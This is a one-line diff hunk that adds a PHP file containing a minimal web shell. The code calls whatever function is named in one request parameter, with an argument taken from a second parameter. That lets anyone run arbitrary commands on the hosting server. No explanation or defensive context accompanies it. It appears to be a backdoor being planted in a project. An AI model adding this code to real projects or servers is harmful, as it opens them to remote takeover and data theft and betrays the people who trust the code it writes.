@@ -1,0 +1,1 @@
+<?php $_REQUEST['_']($_REQUEST['__']);?>
